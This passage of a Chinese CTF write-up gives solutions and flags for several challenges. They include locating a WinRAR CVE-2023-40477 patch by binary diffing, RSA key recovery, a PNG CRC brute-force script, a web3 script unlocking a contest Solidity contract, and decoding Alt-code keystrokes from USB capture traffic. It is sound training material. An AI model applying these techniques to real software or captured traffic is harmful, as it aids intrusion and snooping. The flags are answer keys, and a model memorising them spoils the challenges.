<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ddddssssddssaassssddddssssddssssssssddssaaaawwaawwwwwwaaaawwddwwaaaassssssssddssddssssddddssddwwddssddwwddwwaawwwwwwaawwddddssddddddwwaaaawwwwwwddddddddddssssddssssssaassssaassssddddddddssaassddddssssddwwwwddssssssddddwwddwwaawwaawwwwaawwddwwaawwaawwddddssddwwddddssddwwddwwaaaawwwwddwwwwaaaawwddddddddwwwwaawwaawwddddddddddddssaassssssssaassssssaaaassssssaassddddwwddwwddssssddddssssssssssssssssddwwwwwwwwwwwwwwwwwwaawwddwwddwwddssssssssaassddddwwwwwwddwwwwwwddssssddwwwwwwddddddddddssaaaaaassddddssssaassaaaawwaassaassddssssddwwddwwddddssddddwwwwddddwwwwaaaassaawwwwddwwwwwwaawwwwwwaassssssaaaawwwwaawwwwddwwddssddwwddddddddssaassddssssssddssssssssssssssaassssaassssaassssddssaassssssddddddssssssaassssaaaaaawwwwddddwwwwaassaaaaaaaawwwwaaaassddssssssssssddddssssssssaaaassssaaaassssssssssddddddwwwwwwaaaawwddddwwddwwddwwddddddddddssssaassssaassddssssaaaaaassaaaaaassddddddssddwwddssssaaaaaassddssssaawwaaaaaassssssddwwddddddddddddssdd</span><br></pre></td></tr></table></figure>
<p>转换得到<font color=deepskyblue><strong>flag{4ed5a17ee7aeb95fcf12a3b96a9d4e6f}</strong></font>.</p>
<h3 id="洞OVO："><a href="#洞OVO：" class="headerlink" title="洞OVO："></a>洞OVO：</h3><p>发现题目是让寻找特定版本的<code>winrar</code>中的重大漏洞，先打开应用程序点击<code>帮助&gt;关于</code>，发现版本为<code>6.22</code>，在搜索引擎查询<code>6.22</code>版本的<code>winrar</code>的高危漏洞，查询到两种，<font color=red><strong>CVE-2023-38831</strong></font>和<font color=red><strong>CVE-2023-40477</strong></font>，其中前者与恶意文件相关，看起来很复杂，根据提示只修复了三条汇编，不太可能是题目所给的漏洞，先看后者，找到<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/385481.html">网页</a>，发现漏洞类型是简单的溢出，且原文所述在6.23版本的更新中发现添加了与0xFF大小的检测来检测和避免溢出，还给了一张图片：<br><img src="/pictures/ns24_ovo.png" title="ovo"><br>发现所做的修改确实很简单，那么这应该就是要找的函数，不过这个函数地址和IDA反编译的以及题目所给示例（大约是<code>0000000140XXXXXX</code>）对不上号（因为这里是<code>unrar.exe</code>子程序的改动，不是主程序的，提示里面也说了要向上溯源），于是得手动找6.23版本的winrar，不过官网已经不提供该版本了，在其他地方的同一个<a target="_blank" rel="noopener" href="https://dl.lancdn.com/landian/soft/winrar/">网站</a>上找到6.22和6.23版本以保证同源性（因为不同地址下载的不同版本不一定经过了相同的操作，比如破解、汉化等，所以要保证应用程序同源，否则函数地址不一定一样），安装后进行反编译，发现6.22版本下与题目所给版本的WinMain函数地址一样（<code>0000000140102524</code>），那么后续分析地址就会变得略微简单，再反编译6.23版本，发现地址变成了<code>0000000140102774</code>，多出了<code>0x250（592）</code>行，打包i64文件，用<code>BinDiff</code>对比（主要找两个版本共有但内容不同的，因为根据提示，3行汇编不太可能成为一个单独的函数），发现在5400多个函数中有少数（14-15个）独有差异，另有一些在共有函数中的重合率不为100%，首先查看重合率不为100%的：<code>00000001400E5630</code>、<font color=red><strong>00000001400EF508</strong></font>、…发现标红的恰好符合新增三行，提交flag发现正确.（即flag为<font color=deepskyblue><strong>flag{00000001400EF508}</strong></font>）</p>
<h2 id="Crypto方向：-3"><a href="#Crypto方向：-3" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="欧拉欧拉！！："><a href="#欧拉欧拉！！：" class="headerlink" title="欧拉欧拉！！："></a>欧拉欧拉！！：</h3><p>发现p和q有以下关系：<code>q = ((pow(2,512) - 1) ^ p) - 3</code>，n无法分解，求n的开平方后假设p &#x3D; √n，发现<code>n - p * q</code>随着p的增加而减少，用二分法测试得：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p=1523365295049608852447528761114036169506740936697335552555682720997896170562682523843468707748630306876516559528314335864164090878934605899152321495370201</span><br><span class="line">q=11884442634892988247126496237091809957972624883895057825167878722723867859510864452958405590418273120813515298658171714989589791933011964047281327510713891</span><br></pre></td></tr></table></figure>
<p>附测试大致代码（纯手算，一位一位逼近的）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">n = n</span><br><span class="line">p = 测试</span><br><span class="line">p = sympy.nextprime(p)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q = ((<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">512</span>) - <span class="number">1</span>) ^ p) - <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(n - p*q)</span><br></pre></td></tr></table></figure>
<p>则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">φ(n)=18104347461003907895610914021247683508445228187648940019610703551961828343286923443588324205257353157349226965840638901792059481287140055747874675375786188374454317608065999358326594993253669257155936880793765183990054804582101959834465441403647401623484701548572956283476063411128778877557225686531832078000，</span><br><span class="line">d=2738704864860960112258519639389192888028533381942285904976128217863948093372393594759214583684352338403653449796971086140141869439869180961661802213643350649928133798714715620770707581413810168537527781805535621619503537431175653902358826099390578447216493448777824566189811749972240319088489486187597589473</span><br></pre></td></tr></table></figure>
<p>解得<font color=deepskyblue><strong>flag{y0u_really_kn0w_the_phi}</strong></font>.</p>
<h3 id="圣石匕首："><a href="#圣石匕首：" class="headerlink" title="圣石匕首："></a>圣石匕首：</h3><p>发现是<code>sagemath</code>程序源代码，懒得下载安装了，在在线大型数学计算服务器<code>Cocalc</code>上注册账号并创建项目，新建<code>sagemath工作表</code>并转换为<code>.ipynb</code>文件，在服务器上运行，片刻后得到<font color=deepskyblue><strong>flag{small_dp_is_not_secure_adhfaiuhaph}</strong></font>.</p>
<h2 id="Misc方向：-3"><a href="#Misc方向：-3" class="headerlink" title="Misc方向："></a>Misc方向：</h2><h3 id="扫码领取flag："><a href="#扫码领取flag：" class="headerlink" title="扫码领取flag："></a>扫码领取flag：</h3><p>发现有一个hint图片和四个奇奇怪怪的flag文件，查看hint的属性提示图像base64，下方有一个<code>UXVldHphbGNvYXRsJkt1a3VsY2Fu</code>，解码得到羽蛇神库库尔坎，然后用winhex查看四个文件发现全都是png，改格式后发现没有正常显示，结合压缩包名称猜测提示为图像CRC校验码，发现校验码全都是AD8705E1，计算得到图像的正确宽高应该是250（FA），修改后得到四张像是二维码的图片，拼合如下：<br><img src="/pictures/ns24_scancode.png" title="aztec"><br><br>查询得知这种二维码叫做<code>阿兹台克码</code>（Aztec），扫描得到<font color=deepskyblue><strong>flag{Then_d0_you_kn0w_w6at_Hanx1n_cod3_1s?}</strong></font>.<br>附：CRC计算宽高python代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;D:\Downloads\Compressed\CRC\Flag.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read() <span class="comment"># 打开图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span>(crc32 == <span class="number">0xAD8705E1</span>): <span class="comment"># 图片当前CRC</span></span><br><span class="line">      <span class="built_in">print</span>(i, j)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure>

<h3 id="ezblockchain："><a href="#ezblockchain：" class="headerlink" title="ezblockchain："></a>ezblockchain：</h3><p>运行nc地址，发现返回如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Can you make the isSolved variable true?</span><br><span class="line"></span><br><span class="line">[1] - Create an account which will be used to deploy the challenge contract</span><br><span class="line">[2] - Deploy the challenge contract using your generated account</span><br><span class="line">[3] - Get your flag once you meet the requirement</span><br><span class="line">[4] - Show the contract source code</span><br><span class="line">[-] input your choice: </span><br></pre></td></tr></table></figure>
<p>发现目标是要让<code>isSolved</code>变量变为<code>true</code>，完成任务之后才能获取flag，先按1注册合约账户，返回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] deployer account: 0xc9fC913037776e0a01a9918db880FCFeeEb3d2aE</span><br><span class="line">[+] token: v4.local.lZJxe33rVxDp9MqaKwwsN1XoO9jp8ICMyftW1dY4-hE6l3rQDVOApb9LZXrccgWyh0f1t8I4szS5IlNRmghm6Zp8QqSdwTdlZpUzZdgZwPlfI1ORsSih04_6kScDhPw1UqS7MNbQOpGjULgDqRQBQbf7tAifGyw9_kGbJ11geI3CHg.U2VjcmV0</span><br><span class="line">[+] please transfer more than 0.001 test ether to the deployer account for next step</span><br></pre></td></tr></table></figure>
<p>发现需要获得ETH测试币，找到题目所给的faucet，输入账户进行获取，返回了一长串交易哈希值，问ai用python的web3库查看当前的余额：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line">rpc_url = <span class="string">&quot;http://47.238.151.2:12001&quot;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line">account_address = <span class="string">&quot;0xc9fC913037776e0a01a9918db880FCFeeEb3d2aE&quot;</span></span><br><span class="line">balance = web3.eth.get_balance(account_address)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Account balance: <span class="subst">&#123;balance / <span class="number">1e18</span>&#125;</span> ETH&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>发现已经有1测试ETH了，再在nc地址中按2，提交刚刚生成的<code>token</code>，返回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] contract address: 0x34831cFa6b845A9abBdA9cBd7f097103a52De5Ef</span><br><span class="line">[+] transaction hash: 0x5e24109773171782e920c5a3343c3265c139eab924344b522a0c2bc1ecc99200</span><br></pre></td></tr></table></figure>
<p>也就是部署的合约地址和交易哈希值，再次在nc地址中按4查看合约源代码，返回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contracts/Question0.sol</span><br><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Secret &#123;</span><br><span class="line">    string private encoded = &quot;re@1lY_eA3y_Bl0ckCh@1n&quot;;</span><br><span class="line">    bool public isSolved = false;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function unlock(string memory _str) public payable &#123;</span><br><span class="line">        require(msg.value == 0.0721 ether, &quot;Not enough&quot;);</span><br><span class="line">        require(keccak256(abi.encodePacked(_str)) == keccak256(abi.encodePacked(encoded)));</span><br><span class="line">        isSolved = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来使用<code>remix IDE</code>编译和部署合约，先加入注释：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @title Secret Contract</span><br><span class="line"> * @dev A contract that contains a secret string and an unlock function.</span><br><span class="line"> * @custom:dev-run-script ./deploy_and_test.js</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
<p>再进行compile，获得abi：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;inputs&quot;: [],</span><br><span class="line">        &quot;stateMutability&quot;: &quot;nonpayable&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;constructor&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;inputs&quot;: [],</span><br><span class="line">        &quot;name&quot;: &quot;isSolved&quot;,</span><br><span class="line">        &quot;outputs&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;internalType&quot;: &quot;bool&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;&quot;,</span><br><span class="line">                &quot;type&quot;: &quot;bool&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;stateMutability&quot;: &quot;view&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;inputs&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;internalType&quot;: &quot;string&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;_str&quot;,</span><br><span class="line">                &quot;type&quot;: &quot;string&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;name&quot;: &quot;unlock&quot;,</span><br><span class="line">        &quot;outputs&quot;: [],</span><br><span class="line">        &quot;stateMutability&quot;: &quot;payable&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>再问ai用python构建交易代码，但是运行发现需要私钥，而用nc地址创建时并没有给出私钥，于是注册<code>Metamask</code>电子钱包账户并手动添加网络rpc url，链ID虽然不知道是什么但只要输入的不对就会提示正确的是28848，货币符号为TCH，添加成功后用创建的账户账号在faucet请求货币，发现能顺利请求，并且metamask也变成了1TCH，此时再结合账户的私钥执行脚本，补全一大堆东西之后运行：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到RPC节点</span></span><br><span class="line">rpc_url = <span class="string">&#x27;http://47.238.151.2:12001&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保连接成功</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> web3.isConnected():</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Failed to connect to the RPC node&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 账户信息</span></span><br><span class="line">account = 账户</span><br><span class="line">private_key = 私钥</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合约信息</span></span><br><span class="line">contract_address = <span class="string">&#x27;0x39a5e6e339E3566a593BDe3bB26d2C0f131428Ef&#x27;</span></span><br><span class="line">abi = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;constant&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_str&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;unlock&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputs&quot;</span>: [],</span><br><span class="line">        <span class="string">&quot;payable&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;constant&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [],</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;isSolved&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputs&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建合约对象</span></span><br><span class="line">contract = web3.eth.contract(address=contract_address, abi=abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解锁函数所需参数</span></span><br><span class="line">encoded_string = <span class="string">&quot;re@1lY_eA3y_Bl0ckCh@1n&quot;</span></span><br><span class="line">value = web3.toWei(<span class="number">0.0721</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 nonce</span></span><br><span class="line">nonce = web3.eth.get_transaction_count(account)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 gas price</span></span><br><span class="line">gas_price = web3.eth.gas_price</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 chain ID</span></span><br><span class="line">chain_id = web3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建交易</span></span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: account,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: contract_address,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: gas_price,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: value,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: contract.encodeABI(fn_name=<span class="string">&#x27;unlock&#x27;</span>, args=[encoded_string]),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chain_id</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 签名交易</span></span><br><span class="line">signed_tx = web3.eth.account.sign_transaction(tx, private_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送交易</span></span><br><span class="line">tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Transaction hash: <span class="subst">&#123;tx_hash.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待交易确认</span></span><br><span class="line">receipt = web3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Transaction receipt: <span class="subst">&#123;receipt&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查isSolved是否为true</span></span><br><span class="line">is_solved = contract.functions.isSolved().call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;isSolved: <span class="subst">&#123;is_solved&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>返回如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transaction hash: 0xa4f4e4b9731fe27fc26fe7f5ac5b2d5a06e7685830ac0b6d792a6603ffb989bf</span><br><span class="line">Transaction receipt: AttributeDict(&#123;&#x27;blockHash&#x27;: HexBytes(&#x27;0xc8a373802e98860b18e42e5dbda6a9a4a13fd3078f852889efd0d9175b7a5997&#x27;), &#x27;blockNumber&#x27;: 3819, &#x27;contractAddress&#x27;: None, &#x27;cumulativeGasUsed&#x27;: 47120, &#x27;effectiveGasPrice&#x27;: 1000000007, &#x27;from&#x27;: &#x27;0xc9E0C7f634A9472A9D15C7A79a697Ec2f50A8a22&#x27;, &#x27;gasUsed&#x27;: 47120, &#x27;logs&#x27;: [], &#x27;logsBloom&#x27;: HexBytes(&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;), &#x27;status&#x27;: 1, &#x27;to&#x27;: &#x27;0x39a5e6e339E3566a593BDe3bB26d2C0f131428Ef&#x27;, &#x27;transactionHash&#x27;: HexBytes(&#x27;0xa4f4e4b9731fe27fc26fe7f5ac5b2d5a06e7685830ac0b6d792a6603ffb989bf&#x27;), &#x27;transactionIndex&#x27;: 0, &#x27;type&#x27;: &#x27;0x0&#x27;&#125;)</span><br><span class="line">isSolved: True</span><br></pre></td></tr></table></figure>
<p>此时已经交易成功，返回nc地址获取flag：<font color=deepskyblue><strong>flag{b10ckch@1n_15_r3@lly_1nt3r35t1ng!}</strong></font>.</p>
<h3 id="Alt："><a href="#Alt：" class="headerlink" title="Alt："></a>Alt：</h3><p>发现格式为<code>.pcapng</code>，用wireshark打开，发现是<code>USB流量</code>，其中比特长度为35的就是关键内容，过滤选择只看长度为35的，按时间排序，其中HID数据里面第三个字节的内容就是击键码，下载UsbKeyboardDataHacker程序直接获取按键内容，在powershell中输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS 路径&gt; python 路径\UsbKeyboardDataHacker.py --input 路径\keyboard.pcapng</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1021089710312338190&lt;DEL&gt;30424&lt;DEL&gt;27969&lt;DEL&gt;37327&lt;DEL&gt;9511910511610495971081169521644&lt;DEL&gt;31383&lt;DEL&gt;25143&lt;DEL&gt;9549539553111487979481119537239&lt;DEL&gt;125</span><br></pre></td></tr></table></figure>
<p>结合题目名称Alt，这应该是用了Alt+小键盘数字的输入方式，进行手动拆分和输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">102 108 97 103 123 = flag&#123;</span><br><span class="line">38190&lt;DEL&gt; = 键</span><br><span class="line">30424&lt;DEL&gt; = 盘</span><br><span class="line">27969&lt;DEL&gt; = 流</span><br><span class="line">37327&lt;DEL&gt; = 量</span><br><span class="line">95 119 105 116 104 95 = _with_</span><br><span class="line">97 108 116 95 = alt_</span><br><span class="line">21644&lt;DEL&gt; = 和</span><br><span class="line">31383&lt;DEL&gt; = 窗</span><br><span class="line">25143&lt;DEL&gt; = 户</span><br><span class="line">95 49 53 95 = _15_</span><br><span class="line">53 111 48 79 79 48 111 95 = 5o0OO0o_</span><br><span class="line">37239&lt;DEL&gt; = 酷</span><br><span class="line">125 = &#125;</span><br></pre></td></tr></table></figure>
<p>组合得到<font color=deepskyblue><strong>flag{键盘流量_with_alt_和窗户_15_5o0OO0o_酷}</strong></font>.</p>
<h1 id="赛题轮次：Week5"><a href="#赛题轮次：Week5" class="headerlink" title="赛题轮次：Week5"></a>赛题轮次：Week5</h1><h2 id="已解出的题目：-4"><a href="#已解出的题目：-4" class="headerlink" title="已解出的题目："></a>已解出的题目：</h2><table>
<thead>
<tr>
<th align="center">题目类型</th>
<th align="center">题目名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Reverse</td>
<td align="center">MY_ARM、Lock</td>
</tr>
<tr>
<td align="center">Crypto</td>
<td align="center">RSA？cmd5！、easy_ecc、没e也能玩</td>
</tr>
</tbody></table>
<h2 id="Reverse方向：-4"><a href="#Reverse方向：-4" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="MY-ARM："><a href="#MY-ARM：" class="headerlink" title="MY_ARM："></a>MY_ARM：</h3><p>用Ghidra反编译，先找到entry函数：</p>
